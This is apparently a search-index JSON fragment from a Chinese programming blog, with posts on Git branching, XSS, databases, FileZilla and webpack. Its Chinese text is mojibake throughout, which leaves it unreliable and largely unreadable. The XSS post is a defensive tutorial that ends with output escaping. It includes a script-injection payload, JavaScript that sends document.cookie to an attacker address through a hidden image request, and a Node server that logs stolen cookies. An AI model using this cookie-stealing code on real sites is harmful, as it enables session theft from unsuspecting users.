ï¼ˆå› ç‚ºä½ ä¸èƒ½æŠŠé‚„æ²’é–‹ç™¼å®Œçš„æ–°åŠŸèƒ½çµ¦ä¸€èµ·ç™¼ä½ˆå‡ºå»ï¼Œæ‰€ä»¥ä½ ä¸€å®šè¦å…ˆæ‹¿æ‰æ–°åŠŸèƒ½ï¼Œä¿®å¥½ Bugï¼Œæ¥è‘—æ‰æŠŠä¿®å¾©å¥½çš„æª”æ¡ˆç™¼ä½ˆã€‚ï¼‰ é€™ç¨®åšæ³•å«åšã€Œä¸€æ¢ç·šçš„é–‹ç™¼æ–¹å¼ã€ã€‚é€™ç¨®æ–¹å¼æœ‰å€‹å¾ˆå¤§çš„å•é¡Œï¼šä½ æ²’æœ‰è¾¦æ³•åŒæ™‚è™•ç†å¤šå€‹äº‹æƒ…ã€‚ ä½†æ˜¯ï¼Œç¾åœ¨å¦‚æœé€éç‰ˆæ§è»Ÿé«”ï¼ˆä¾‹å¦‚ Gitï¼‰å°±å¯ä»¥å»ºç«‹ä¸€å€‹å‡ºã€Œåˆ†æ”¯ï¼ˆå…©æ¢ç·šï¼‰ã€çš„æ¦‚å¿µï¼š 12A ç·šï¼šç©©å®šç‰ˆ -&gt; æ–°åŠŸèƒ½ -&gt; æ–°åŠŸèƒ½ -&gt; ...B ç·šï¼šç©©å®šç‰ˆ -&gt; bug fix -&gt; bug fix -&gt; ... ä½ è¦é–‹ç™¼æ–°åŠŸèƒ½ï¼Œå°±åœ¨ A ç·šé€™æ¢åˆ†æ”¯ä¸Šé–‹ç™¼ï¼›ä½ è¦ä¿®å¾© Bugï¼Œå°±åœ¨ B ç·šé€™æ¢åˆ†æ”¯ä¸Šä¿®å¾©ï¼Œä¸éœ€è¦åƒå‰›æ‰ä¸€æ¨£ï¼Œå…ˆæŠŠæ–°åŠŸèƒ½æ‹¿æ‰ï¼Œæ¥è‘—å†ä¾†ä¿® Bug é€™éº¼éº»ç…©ã€‚ æ¥è‘—ï¼Œç•¶æ–°åŠŸèƒ½é–‹ç™¼å®Œæˆå¾Œï¼Œæˆ‘å€‘ä¸éœ€è¦ A ç·šé€™æ¢åˆ†æ”¯äº†ï¼Œæ‰€ä»¥æˆ‘å€‘æœƒæŠŠ Aã€B åˆä½µèµ·ä¾†ï¼ˆå‡è¨­æŠŠ A ä½µåˆ° Bï¼‰ï¼Œå°±æœƒè®Šæˆé€™æ¨£ï¼š 1B ç·šï¼šç©©å®šç‰ˆ -&gt; bug fix -&gt; bug fix -&gt; ... -&gt; æ–°åŠŸèƒ½ -&gt; ... -&gt; æ–°åŠŸèƒ½ -&gt; æ­£å¼ç™¼ä½ˆ æ‰€ä»¥é€éç‰ˆæ§è»Ÿé«”ï¼Œå¤§å®¶å°±å¯ä»¥åœ¨ A ç·šæˆ– B ç·šä¸Šå„åšå„çš„äº‹æƒ…ï¼Œä¸ç”¨æ“”å¿ƒå½¼æ­¤ä¹‹é–“æœƒäº’ç›¸å¹²æ“¾ã€‚ æœ€å¾Œç•¶å…¶ä¸­ä¸€æ¢ç·šçš„ä»»å‹™å®Œæˆæ™‚ï¼Œåªè¦é€éã€Œåˆä½µã€çš„æ–¹å¼ä¾†è®Šå›ä¸€æ¢ç·šï¼Œå°±å®Œæˆåœ˜éšŠä¹‹é–“çš„å”ä½œäº†ã€‚","link":"/2021/12/12/what-is-version-control/"},{"title":"å¾ç©å£è‡ªå·±çš„ç¶²ç«™ä¾†å­¸ç¿’ XSS","text":"å£æ‰å•¦ï½ ç°¡è¿°XSSï¼ˆCross Site Scriptingï¼‰è·¨ç¶²ç«™æŒ‡ä»¤ç¢¼ã€‚ ç°¡å–®ä¾†èªªå°±æ˜¯ã€Œåœ¨åˆ¥äººçš„ç¶²ç«™ä¸ŠåŸ·è¡Œç¨‹å¼ç¢¼ã€ï¼Œç­‰ä¸€ä¸‹æˆ‘æœƒç”¨å„ç¨®æ–¹å¼ä¾†ç¤ºç¯„æ€éº¼æŠŠè‡ªå·±çš„ç¶²ç«™ç©å£ï¼Œè®“ä½ ä¸€ç›®äº†ç„¶ XSS åœ¨åšä»€éº¼ï¼Œä»¥åŠè©²å¦‚ä½•é˜²ç¯„ XSSã€‚ åœ¨ç¤ºç¯„ä¹‹å‰ä¹Ÿè§£é‡‹ä¸€ä¸‹ç‚ºä»€éº¼æœƒæœ‰ XSSã€‚å…¶å¯¦èªªç©¿äº†å°±æ˜¯å¯«ç¶²ç«™çš„æ™‚å€™æ²’æœ‰å°ä½¿ç”¨è€…çš„è¼¸å…¥å…§å®¹åšè™•ç†è€Œç”¢ç”Ÿçš„æ¼æ´ã€‚æ‰€ä»¥è¦é˜²ç¯„ XSS å°±è¦æŠŠé€™å¥è©±éŠ˜è¨˜åœ¨å¿ƒï¼š æ°¸é ä¸è¦ç›¸ä¿¡ Client ç«¯çš„è¼¸å…¥å…§å®¹ æ„æ€å°±æ˜¯èªªä½ ä¸è¦é æœŸä½¿ç”¨è€…æœƒç…§è‘—ä½ è…¦è£¡çš„æƒ³æ³•èµ°ï¼Œä½ å¯èƒ½é æœŸä»–æœƒåœ¨è¼¸å…¥æ¡†è¼¸å…¥ã€ŒHello, I'm friendlyã€ï¼Œä½†ä¸æ˜¯é€™æ¨£ï¼Œçµ•å°æœƒæœ‰é‚£ç¨®ç¡¬è¦è¼¸å…¥ã€Œ&lt;script&gt;alert(\"Yo, I\\'m bad guy\")&lt;/script&gt;ã€çš„äººå­˜åœ¨ã€‚ æ‰€ä»¥åœ¨å¼·èª¿ä¸€æ¬¡ï¼š æ°¸é ä¸è¦ç›¸ä¿¡ Client ç«¯çš„è¼¸å…¥å…§å®¹ æ°¸é ä¸è¦ç›¸ä¿¡ Client ç«¯çš„è¼¸å…¥å…§å®¹ æ°¸é ä¸è¦ç›¸ä¿¡ Client ç«¯çš„è¼¸å…¥å…§å®¹ ä¾†æç ´å£å§ï¼æ”»æ“Šä¸€ï¼šYoï¼Œé§­å®¢å°±æ˜¯è¦é«˜èª¿åˆ°è®“å…¨ä¸–ç•Œéƒ½çŸ¥é“ã€‚ ç°¡å–®ä¾†èªªå°±æ˜¯æƒ¡ä½œåŠ‡å•¦ï½ æ”»æ“ŠäºŒï¼šé‡£é­šé‡£é­šé‡£åˆ°ä»€éº¼é­šï¼Ÿ é€šå¸¸æ˜¯ç”¨ä¾†æŠŠä½¿ç”¨è€…å¸¶åˆ°ä¸€å€‹è·ŸåŸç¶²ç«™é•·çš„å¾ˆåƒçš„ã€Œé‡£é­šç¶²ç«™ã€ä¾†åšå£äº‹ã€‚ æ”»æ“Šä¸‰ï¼šé¤…ä¹¾æ€ªç¸çš„é€†è¥²ï¼Œå…¨ä¸–ç•Œçš„ Cookie éƒ½æ˜¯æˆ‘çš„ï¼Œæ˜¯æˆ‘çš„ï¼ æ—¢ç„¶ document.cookie å¯ä»¥å­˜å–ã€Œä½¿ç”¨è€…åœ¨é€™å€‹ç¶²ç«™å„²å­˜çš„ cookieã€ï¼Œé‚£éº¼åªè¦ç™¼æ®ã€Œå‰µæ„ã€ï¼Œå°±å¯ä»¥æŠŠ cookie é€åˆ°é§­å®¢æƒ³è¦çš„åœ°æ–¹ï¼ˆç•¶æˆ‘ foodpandaï¼Ÿï¼‰ï¼Œä¾‹å¦‚èªªï¼š 12345678910// é§­å®¢æƒ³è¦é€åˆ°çš„åœ°æ–¹let address = 'http://localhost:5000'// å»ºç«‹ &lt;img&gt;let img = document.createElement('img')// å­˜å– cookie çš„ä»£ç¢¼let cookie = document.cookie// è¨­å®š &lt;img src=\"http://localhost:5000?cookie=value\"&gt;img.setAttribute('src', `${address}/?cookie=${encodeURIComponent(cookie)}`)// æ’åˆ° DOM è£¡é¢document.body.appendChild(img) å‡è£è‡ªå·±æ˜¯é§­å®¢ï¼Œæ¶ä¸€å€‹ä¼ºæœå™¨ä¾†ç©ç©çœ‹æ˜¯ä¸æ˜¯çœŸçš„èƒ½å·åˆ°ï¼š è¼•è¼•é¬†é¬†æ‹¿åˆ°æ‰‹ï¼ç¾åœ¨æ‰€æœ‰ä¾†é€™å€‹ç¶²ç«™çš„äººçš„ cookie éƒ½æœƒé€åˆ°æˆ‘æ‰‹ä¸Š áƒš(â€¢Ï‰ â€¢áƒš) è§£é‡‹ä¸€ä¸‹é€™é‚Šåœ¨åšä»€éº¼ã€‚ç°¡å–®ä¾†èªªæ˜¯æ’å…¥ä¸€å€‹æ ¹æœ¬ä¸æœƒé¡¯ç¤ºå‡ºä¾†çš„åœ–ç‰‡ï¼Œç›®çš„æ˜¯è¦åˆ©ç”¨ src ä¾†ç™¼ requestï¼ŒæŠŠæ‹¿åˆ°çš„ cookie é€åˆ°é§­å®¢é‚£é‚Šï¼Œé€™å°±æ˜¯æœ€å…¸å‹çš„å· cookie æ–¹å¼ã€‚ ä¸è¦æ‡·ç–‘ï¼Œæ‰€æœ‰ç”¨åˆ°å¤–éƒ¨è³‡æºçš„çš„æ±è¥¿ï¼Œåƒæ˜¯ &lt;link href=\"...\"&gt; &lt;img src=\"...\"&gt; å…¶å¯¦éƒ½æœƒç™¼å‡ºä¸€å€‹ requestï¼Œåªæ˜¯ä½ å¤ªå°‘å»æ³¨æ„äº†æ‰€ä»¥ä¸æœƒç™¼ç¾èƒŒå¾Œæ˜¯é€™æ¨£å­ã€‚ æœ€å¾Œé™„ä¸Šé§­å®¢çš„ä¼ºæœå™¨é‚è¼¯æ€éº¼å¯«çš„ï¼š 12345678910111213141516// å»ºç«‹ http sever çš„æ¨¡çµ„const http = require('http')// è§£æ url çš„æ¨¡çµ„const url = require('url')// ä¼ºæœå™¨è¨­å®šconst server = http.createServer((req, res) =&gt; { // è§£æ url çš„ç‰©ä»¶ {cookie: 'xxxx'} const queryObject = url.parse(req.url, true).query const cookie = queryObject.cookie // æŠŠæ‹¿åˆ°çš„ query string åšè§£ç¢¼å¾Œå°å‡ºä¾† console.log('get cookie:', decodeURIComponent(cookie)) // é€å‡ºç©ºçš„ response res.end()})// port=5000server.listen(5000) å…¶å¯¦å°±æ˜¯ä¸€å€‹éå¸¸é™½æ˜¥çš„ http server è€Œå·²ã€‚ æ”»æ“Šå››ï¼šä½ ä»¥ç‚ºåªèƒ½é ç•™è¨€ï¼Ÿå¤ªå¤©çœŸäº†ï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ é€™å€‹ä¾‹å­æ˜¯æƒ³å¼·èª¿ä»»ä½•ä½¿ç”¨è€…å¯ä»¥è¼¸å…¥çš„åœ°æ–¹éƒ½æœ‰ XSS çš„é¢¨éšªå­˜åœ¨ï¼Œæ‰€ä»¥ä½ çµ•å°è¦éŠ˜è¨˜é‚£å¥è€è©±ï¼š ä»»ä½•ä¾†è‡ª Client ç«¯çš„è¼¸å…¥å…§å®¹éƒ½æ˜¯ä¸èƒ½ç›¸ä¿¡çš„ æŒæ¡é€™å€‹å¤§åŸå‰‡å°±èƒ½é¿æ‰å¤§éƒ¨åˆ†çš„å±éšªäº†ã€‚ ä¿®è£œ XSS æ¼æ´ä¿®è£œçš„æ¦‚å¿µä¹Ÿå¾ˆç°¡å–®ï¼Œæ—¢ç„¶ &lt;script&gt;...&lt;/script&gt; æœƒè¢«è§£è®€ç‚ºç¨‹å¼ç¢¼ï¼Œé‚£å°±ã€Œè·³è„«ã€æˆç´”å­—ä¸²å°±å¥½ï¼Œç¸½ä¹‹å°±æ˜¯æŠŠæ‰€æœ‰ä½¿ç”¨è€…çš„è¼¸å…¥å…§å®¹éƒ½ç•¶ä½œã€Œç´”æ–‡å­—ã€ä¾†è¼¸å‡ºå°±å¯ä»¥äº†ã€‚ å‚™è¨»ï¼šæˆ‘åŸæœ¬ä¹Ÿä»¥ç‚ºåœ¨å­˜åˆ°è³‡æ–™åº«ä»¥å‰å°±å…ˆåšè·³è„«æ¯”è¼ƒå¥½ï¼Œä½†å¾Œä¾†èª²ç¨‹ä¸­æåˆ°ï¼Œå»ºè­°è³‡æ–™åº«å­˜ã€Œæ˜ç¢¼ã€æœƒæ¯”è¼ƒå¥½ã€‚å› ç‚ºç•¶å­—ä¸²è¢«è·³è„«æˆåƒ &amp;gt; æ™‚ï¼Œé€™ç¨®æ ¼å¼åªæœ‰åœ¨é›»è…¦ä¸Šèƒ½å¤ è§£è®€ï¼Œä½†å¦‚æœä¹‹å¾Œè¦æ”¯æ´ Android æˆ– IOS ä¹‹é¡çš„è£ç½®å°±æœ‰å¯èƒ½æ²’è¾¦æ³•è§£è®€ï¼Œå› æ­¤æœ€ä¿éšªçš„åšæ³•æ˜¯ä¿ç•™åŸå§‹çš„è³‡æ–™æ ¼å¼ï¼Œæœ€å¾Œåœ¨è¼¸å‡ºçš„æ™‚å€™åšè·³è„«å°±å¥½ã€‚ æœ€å¾Œå°±é™„ä¸Šä¸€ä¸‹ PHP çš„å…§å»ºè·³è„«å‡½å¼ç”¨æ³•ï¼š 1234// utils.phpfunction escape($unsafe) { return htmlspecialchars($unsafe, ENT_QUOTES);} æ¥è‘—æŠŠæ‰€æœ‰ç”±ä½¿ç”¨è€…è¼¸å…¥çš„åœ°æ–¹éƒ½ç”¨ escape() è™•ç†å¾Œå†è¼¸å‡ºå°±å®‰å…¨äº†ï¼š 12345&lt;!-- index.php --&gt;&lt;div class=\"greeting\"&gt;å—¨ï½&lt;?php echo escape($nickname); ?&gt;ï¼Œä»Šå¤©ä¹Ÿä¾†å¯«é»æ±è¥¿å§ (ï¾‰&gt;Ï‰&lt;)ï¾‰&lt;/div&gt;&lt;div class=\"card__author\"&gt;&lt;?php echo escape($row['nickname']); ?&gt;&lt;/div&gt;&lt;div class=\"card__time\"&gt;&lt;?php echo escape($row['created_at']); ?&gt;&lt;/div&gt;&lt;div class=\"card__text\"&gt;&lt;?php echo escape($row['content']); ?&gt;&lt;/div&gt;","link":"/2022/02/09/what-is-xss/"},{"title":"ç‚ºä»€éº¼è¦ç”¨è³‡æ–™åº«ï¼Ÿ","text":"ç†è§£åŸå› å°±ä¸è¤‡é›œäº†ã€‚ ç‚ºä»€éº¼è¦æœ‰è³‡æ–™åº«ï¼Ÿå¦‚æœä¸è€ƒæ…®å¤ªå¤šï¼Œä½ å¯èƒ½æœƒæƒ³èªªæˆ‘å°±é–‹å€‹è¨˜äº‹æœ¬ä¾†å­˜è³‡æ–™å°±å¥½ï¼š 123å­¸ç”Ÿ | åœ‹æ–‡ | æ•¸å­¸ | è‹±æ–‡1001 80 60 301002 50 40 80 ä½†é€™æ¨£åšæœ‰ä»€éº¼å•é¡Œï¼Ÿ æˆ‘è¦æ‰¾å­¸ç”Ÿæˆ‘åªèƒ½ä¸€å€‹ä¸€å€‹çœ‹ æˆ‘è¦æ‰¾æŸå€‹å­¸ç”Ÿçš„åˆ†æ•¸å°±å¾—ç”¨å­—ä¸²å‡½å¼ä¾†è™•ç†ï¼ˆä¾‹å¦‚ split(' ')ï¼‰ æ‰€ä»¥æ˜¯ä»€éº¼å•é¡Œï¼Ÿæ•ˆç‡å•é¡Œã€‚ è³‡æ–™åº«çš„åˆè¡·ç‚ºäº†è§£æ±ºé€™å€‹å•é¡Œï¼Œæœ‰äººå°±é–‹ç™¼äº†ã€Œè³‡æ–™åº«ã€ç³»çµ±ã€‚ é€™å€‹ç³»çµ±æœƒæä¾›ä¸€å€‹ã€Œç¨‹å¼èªè¨€ã€ï¼Œä½ å¯ä»¥é€éé€™å€‹ç¨‹å¼èªè¨€ä¾†å­˜å–è³‡æ–™ï¼Œä¸€åˆ‡éƒ½å¾ˆæ–¹ä¾¿ï¼Œä¸ç”¨å†è‡ªå·±åšè™•ç†ã€‚ æ‹¿ SQL èˆ‰ä¾‹ï¼Œå‡è¨­æˆ‘æƒ³æ‰¾ username æ˜¯ PeaNu çš„æ¬„ä½ï¼š 1SELECT `id`, `username`, `content`, `created_at` FROM `first` WHERE username = 'PeaNu' é€™æ¨£æœƒæ¯”æˆ‘ç”¨å­—ä¸²è™•ç†ä¾†çš„æ–¹ä¾¿ï¼Œè€Œä¸”å¥½è¨˜åˆå¿«é€Ÿã€‚ ç¸½ä¹‹å‘¢ï¼Œä½ ä¸ç”¨å¤ªç³¾çµå®ƒåº•å±¤æ˜¯æ€éº¼é‹ä½œçš„ï¼Œå®ƒå…¶å¯¦å°±æ˜¯æä¾›ä¸€å€‹æ›´æ–¹ä¾¿çš„ä»‹é¢ä¾†è®“ä½ åšã€Œè·Ÿè³‡æ–™æœ‰é—œã€çš„è™•ç†ã€‚","link":"/2022/01/30/why-database/"},{"title":"ç‚ºä»€éº¼è¦ç”¨ FileZillaï¼Ÿ","text":"å› ç‚ºâ€¦é»é€²ä¾†çœ‹å§ã€‚ ç°¡è¿°é¦–å…ˆä¾†æ€è€ƒä¸€å€‹å•é¡Œï¼š ç•¶ä½ æœ‰ä¸€å°ä¸»æ©Ÿï¼Œå®ƒä¸åœ¨ä½ å®¶ï¼Œè€Œæ˜¯åœ¨å¾ˆé çš„æŸå€‹åœ°æ–¹ï¼Œå¯æ˜¯ä½ æƒ³æŠŠé›»è…¦è£¡çš„è³‡æ–™å‚³çµ¦å®ƒè¦æ€éº¼è¾¦ï¼Ÿ ç¬¬ä¸€ç¨®ä½œæ³•æ˜¯é€é CLIï¼š å…ˆç”¨ SSH é€£åˆ°é‚£å°è™›æ“¬ä¸»æ©Ÿï¼Œé€™æ¨£ä½ å°±å¯ä»¥æ“æ§å®ƒäº† æ¥è‘—å›åˆ°æœ¬åœ°ç«¯ï¼ŒæŠŠä½ æƒ³è¦çš„æª”æ¡ˆä¸Šå‚³åˆ°æŸå€‹å¯ä»¥å­˜æª”æ¡ˆçš„å¹³å°ï¼ˆä¾‹å¦‚ï¼šGithubï¼‰ æ¥è‘—å†å›åˆ°è™›æ“¬ä¸»æ©Ÿï¼Œç”¨ git clone çš„æ–¹å¼æŠŠæª”æ¡ˆæŠ“ä¸‹ä¾† ç¬¬äºŒç¨®åšæ³•æ˜¯ç”¨ FileZillaï¼š ç”¨ FileZilla æä¾›çš„ä»‹é¢è·Ÿè™›æ“¬ä¸»æ©Ÿé€£ç·šï¼ˆæˆ‘æƒ³åº•å±¤æ‡‰è©²ä¸€æ¨£æ˜¯é€é SSHï¼‰ æˆåŠŸé€£ç·šå¾Œï¼Œæ¥ä¸‹ä¾†å°±å¾ˆç›´è¦ºäº†ï¼Œå› ç‚ºæ˜¯åœ–å½¢åŒ–ä»‹é¢ï¼Œä½ ç…§è‘—ç•«é¢æ‘¸å°±èƒ½å¤§æ¦‚æ‘¸å‡ºå€‹æ‰€ä»¥ç„¶ é€™è£¡åœ¨ç¤ºç¯„æ€éº¼æŠŠè™›æ“¬ä¸»æ©Ÿçš„ index.php æŠ“åˆ°æˆ‘çš„é›»è…¦è£¡ã€‚ è‡³æ–¼ç‚ºä»€éº¼è¦ç”¨ FileZillaï¼Ÿæˆ‘è¦ºå¾—ç†ç”±å¾ˆç°¡å–®ï¼Œå› ç‚ºæ¯”è¼ƒæ–¹ä¾¿ï¼Œåªæ˜¯é€™æ¨£å­ã€‚ å¯ä»¥æ€è€ƒçœ‹çœ‹ç”¨ CLI æœ‰ä»€éº¼å•é¡Œï¼Ÿ æ¯ç•¶è¦ä¸Šå‚³ä¸€å€‹æ–°çš„å°ˆæ¡ˆå°±å¾—é‡æ–°é–‹ä¸€å€‹ Repository éç¨‹ä¸­å¾—åè¦†æ“ä½œ Git çš„æŒ‡ä»¤ åªæ˜¯æƒ³ä¿®æ”¹å€‹å°åœ°æ–¹å°±å¾—åœ¨æœ¬åœ°é‡æ–° commitï¼Œç„¶å¾Œå†è®“è™›æ“¬ä¸»æ©Ÿ pull ä¸‹ä¾† ä½†ç”¨ FileZilla å°±ä¸ç”¨æ“”å¿ƒé€™äº›äº†ï¼Œå¯ä»¥æŠŠå®ƒç•¶æˆæ˜¯ä¸€ç¨® Google Cloud çš„æ„Ÿè¦ºï¼ŒçœŸçš„æ–¹ä¾¿è¨±å¤šã€‚","link":"/2022/03/08/why-filezilla/"},{"title":"ç‚ºä»€éº¼è¦ç”¨ webpackï¼Ÿ","text":"åˆ°åº•ç‚ºä»€éº¼å‘¢ï¼Ÿ ç°¡è¿°ç°¡å–®ä¾†èªªï¼ŒWebpack ä¸»è¦æ˜¯ä¸€å€‹ç”¨ä¾†æŠŠã€Œæ¨¡çµ„ã€çµ¦æ‰“åŒ…çš„å·¥å…·ã€‚é™¤äº†æ‰“åŒ…ï¼Œé‚„æœ‰ä¸€äº›å…¶ä»–åŠŸèƒ½ï¼Œä½†é€™é‚Šä¸æœƒç´°è¬›ã€‚ è‡³æ–¼åœ¨å•èƒ½ä¸èƒ½ä¸è¦ç”¨ wepback ä¹‹å‰ï¼Œå…ˆæ€è€ƒçœ‹çœ‹é€™å…©å€‹å•é¡Œï¼š ä½ éœ€è¦è€ƒæ…®ç€è¦½å™¨æ”¯æ´åº¦å—ï¼Ÿå› ç‚ºä¸¦ä¸æ˜¯æ‰€æœ‰ç€è¦½å™¨éƒ½æ”¯æ´ ES Modules ä½ æœƒç”¨åˆ°å¤–éƒ¨å¥—ä»¶å—ï¼Ÿåƒæ˜¯å¾ npm ä¸Šä¸‹è¼‰çš„å¥—ä»¶ï¼Ÿå› ç‚º ES Module æ²’è¾¦æ³•ç›´æ¥è®“ä½ å¼•å…¥ å¦‚æœä½ ä¸éœ€è¦è€ƒæ…®é€™äº›ï¼Œé‚£ä½ å°±å¯ä»¥ä¸è¦ç”¨ï¼Œå› ç‚ºå¤§éƒ¨åˆ†ç”¨ webpack çš„ä¸»è¦ç›®çš„æ˜¯æƒ³è§£æ±ºé€™å…©å€‹å•é¡Œã€‚ æ¥ä¸‹ä¾†ï¼Œæˆ‘æƒ³å…ˆé‡æ¸…ä¸€ä¸‹é—œæ–¼ã€Œæ¨¡çµ„åŒ–ã€çš„æ­£ç¢ºè§€å¿µã€‚ éå»åœ¨ç€è¦½å™¨ä¸Šè¦ç”¨å¥—ä»¶ï¼Œé€šå¸¸æ˜¯é€é src ä¾†å¼•å…¥ï¼Œä¾‹å¦‚ jQueryï¼š 12345&lt;!-- jQuery --&gt;&lt;script src=\"https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js\"&gt;&lt;/script&gt;&lt;script&gt; // æ¥è‘—åœ¨é€™è£¡å°±èƒ½ç”¨ $ æˆ– jQuery ä¾†ä½¿ç”¨&lt;/script&gt; æˆ‘è¦ç‰¹åˆ¥å¼·èª¿é€™å€‹ä¸å«åšæ¨¡çµ„åŒ–ï¼Œç‚ºä»€éº¼ï¼Ÿå› ç‚ºé€™å·²ç¶“æ±™æŸ“åˆ°ã€Œå…¨åŸŸè®Šæ•¸ã€äº†ã€‚ æ‰€è¬‚çš„æ¨¡çµ„åŒ–ï¼Œæ‡‰è©²è¦åƒæ˜¯åœ¨ Node.js ä¸Šç”¨ require çš„æ–¹å¼ä¾†å¼•å…¥å¥—ä»¶ï¼š 1234// èƒ½å¤ è‡ªå·±å®šç¾©æ¨¡çµ„åç¨±const myjQuery = require('jquery');// æˆ–æ˜¯åªå¼•å…¥æˆ‘æƒ³è¦çš„æ±è¥¿const { ajax } = require('jquery'); OKï¼Œåˆ°é€™è£¡ä½ æ‡‰è©²å·²ç¶“ç†è§£ä»€éº¼å«åšæ¨¡çµ„åŒ–ï¼Œæ¥è‘—ä¾†å›é¡§ä¸€ä¸‹æ­·å²ã€‚ å¤§å®¶éƒ½çŸ¥é“åœ¨ ES6 æ¨å‡ºã€ŒES moduleã€ä¹‹å‰ï¼Œç€è¦½å™¨åªèƒ½é€é src ä¾†å¼•å…¥å¥—ä»¶ã€‚æ‰€ä»¥å•é¡Œä¾†äº†ï¼Œåœ¨ ES module æ¨å‡ºä¹‹å‰å®Œå…¨å°±æ²’è¾¦æ³•ç”¨æ¨¡çµ„å—ï¼Ÿ ä¸æ˜¯çš„ï¼Œä¸è¦å¿˜äº†å‰ç«¯çš„é‚£å¥åè¨€ï¼š ç€è¦½å™¨æ²’æœ‰æ”¯æ´çš„æ±è¥¿ï¼Œå°±å¯«ä¸€å€‹å·¥å…·ä¾†è®“å®ƒå¯ä»¥æ”¯æ´å°±å¥½ã€‚ æ‰€ä»¥å°±æœ‰äººå¯«äº† Browserify ä¾†è®“ä½ å¯ä»¥åœ¨ç€è¦½å™¨ä¸Šä¹Ÿç”¨ require çš„æ–¹å¼ä¾†å¼•å…¥å¥—ä»¶ï¼Œè€Œ webpack ä¹Ÿæ˜¯å¾ Browserify çš„æ¦‚å¿µå»¶ä¼¸å‡ºä¾†çš„å·¥å…·ï¼Œåªæ˜¯å®ƒåˆæ›´å¼·å¤§äº†ä¸€é»ã€‚ å¯æ˜¯ä½ æ‡‰è©²æœƒæœ‰å€‹ç–‘å•ï¼Œç‚ºä»€éº¼ ES module æ¨å‡ºå¾Œé‚„éœ€è¦ç”¨ webpack å‘¢ï¼Ÿä¸æ˜¯ç€è¦½å™¨å°±èƒ½åŸç”Ÿæ”¯æ´å—ï¼Ÿ é€™å€‹å•é¡Œä»¥å‰æˆ‘ä¹Ÿæƒ³å¾ˆä¹…éƒ½æä¸æ‡‚ã€‚ä¸éç¾åœ¨æˆ‘ç†è§£äº†ã€‚ æ²’éŒ¯ï¼ŒES module ç¢ºå¯¦æ˜¯ç€è¦½å™¨åŸç”Ÿæ”¯æ´çš„æ±è¥¿ï¼Œå¯æ˜¯å®ƒæœ‰æœ€é–‹å§‹æåˆ°çš„é‚£å…©å€‹å•é¡Œï¼š ç€è¦½å™¨æ”¯æ´åº¦ï¼Œæ¯”è¼ƒèˆŠçš„ç€è¦½å™¨ä¸æ”¯æ´ æ²’è¾¦æ³•å¼•å…¥å¾ npm ä¸Šä¸‹è¼‰çš„å¥—ä»¶ é‚„æœ‰ä¸€äº›å…¶ä»–çš„å°å•é¡Œï¼Œåƒæ˜¯å¾—åœ¨ &lt;script&gt; ä¸ŠåŠ  type=module å’Œå¾—æ­é… server ä¾†é–‹ç™¼ä¹‹é¡çš„ã€‚ ç¸½ä¹‹å‘¢ï¼Œå•é¡Œåœ¨æ–¼ES module é‚„æ˜¯æ²’æœ‰é‚£éº¼æ–¹ä¾¿ä½¿ç”¨ï¼Œé€™å€‹å°±æ˜¯ç”¨ webpack æœ€ä¸»è¦çš„åŸå› äº†ã€‚ æ‰€ä»¥ webpack åˆ°åº•å¥½ç”¨åœ¨å“ªï¼Ÿä¸å¦‚ç›´æ¥çœ‹å€‹ç¤ºç¯„å§ï¼ å¦‚æœæˆ‘æƒ³è¦å¼•å…¥ç”¨ npm ä¸‹è¼‰çš„ jqueryï¼Œæˆ‘å¯ä»¥é–‹ä¸€æ”¯æª”æ¡ˆä¾†å¯« jQueryï¼š 123456789// CommonJSconst myjQuery = require('jquery');myjQuery('body').css('background-color', 'rgba(0, 255, 0, 0.2)');myjQuery('.btn').on('click', () =&gt; console.log('click'));// ES modulesimport jq from 'jquery';jq('body').css('background-color', 'rgba(0, 0, 255, 0.2)');jq('.btn').on('click', () =&gt; console.log('click')); ä¸ç®¡æˆ‘è¦åœ¨è£¡é¢ç”¨ CommonJS æˆ– ES modules ä¾†å¼•å…¥éƒ½æ²’å•é¡Œã€‚æˆ‘åªè¦è¨˜å¾—å¯«å¥½å¾Œç”¨ webpack æ‰“åŒ…ï¼Œæ¥è‘—åœ¨ HTML è£¡é¢åŠ ä¸Šä¸€å¥ï¼š 12&lt;!-- æ‰“åŒ…å¥½çš„æ¨¡çµ„ --&gt;&lt;script src=\"./bundle.js\"&gt;&lt;/script&gt; ä¸éœ€è¦å† type=moduleï¼Œä¹Ÿä¸éœ€è¦é–‹ serverï¼Œæ‹¿å»ç€è¦½å™¨ä¸Šå°±æ˜¯ç›´æ¥å¯ä»¥è·‘ã€‚é€™å€‹å°±æ˜¯ webpack å¼·å¤§çš„åœ°æ–¹ã€‚æ˜æ˜æˆ‘å¯«çš„ä¸æ˜¯ç€è¦½å™¨æ”¯æ´çš„æ±è¥¿ï¼Œå»å¯ä»¥è®“å®ƒçœ‹èµ·ä¾†å°±åƒæœ‰æ”¯æ´ä¸€æ¨£ã€‚ ç‚ºä»€éº¼å¯ä»¥é€™æ¨£ï¼Ÿå¯ä»¥æƒ³æˆæ˜¯ webpack åœ¨ç€è¦½å™¨ä¸Šå¯¦ä½œäº† require æˆ– import é€™å…©å€‹ functionï¼Œé€™æ¨£æ¯”è¼ƒå¥½ç†è§£ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œwebpack é‚„æœ‰æ›´å¤šçš„åŠŸèƒ½ï¼Œåƒæ˜¯ï¼š æŠŠè¦å¼•å…¥çš„ JavaScript å…ˆç”¨ babel ç·¨è­¯å¾Œå†æ‰“åŒ… æ˜æ˜æ˜¯åœ¨ JS è£¡ï¼Œå»å¯ä»¥å¼•å…¥ CSSï¼Œæˆ–ç”šè‡³æ˜¯ SCSS è·Ÿç¬¬ä¸€é»åŒç†ï¼Œå¦‚æœå¼•å…¥çš„æ˜¯ SCSSï¼Œå¯ä»¥å…ˆç·¨è­¯æˆ CSS å¾Œå†æ‰“åŒ… ç¸½ä¹‹é€™é‚Šä¸æ‰“ç®—ç´°è«‡ï¼Œåªæ˜¯é»å‡ºä¾†è®“å¤§å®¶çŸ¥é“ webpack å¯ä»¥åšåˆ°é€™äº›äº‹æƒ…è€Œå·²ã€‚ æ‰€ä»¥ç‚ºä»€éº¼ç¾ä»£å‰ç«¯é–‹ç™¼å¹¾ä¹ 90% éƒ½æœƒç”¨ webpackï¼Ÿ å› ç‚ºå®ƒå¤ªæ–¹ä¾¿äº†ï¼Œå¾ˆé›£æ‰¾åˆ°ä¸ç”¨å®ƒçš„ç†ç”±ã€‚ 